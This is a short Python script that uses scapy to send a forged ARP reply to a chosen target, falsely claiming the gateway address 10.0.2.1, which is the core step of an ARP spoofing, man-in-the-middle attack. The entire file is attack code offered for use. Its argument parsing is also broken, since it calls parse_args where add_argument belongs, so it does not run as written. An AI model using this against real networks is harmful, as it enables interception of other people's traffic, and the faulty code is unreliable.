import scapy.all as scapy
import argparse

parser = argparse.ArgumentParser()
parser.parse_args("-i", dest="tar_ip", help="enter the target  ip")
parser.parse_args("-m", dest="tar_mac", help="enter the target mac")
args = parser.parse_args()


packet = scapy.ARP(op=2, pdst=args.tar_ip, hwdst=args.tar_mac, psrc="10.0.2.1")
scapy.send(packet)
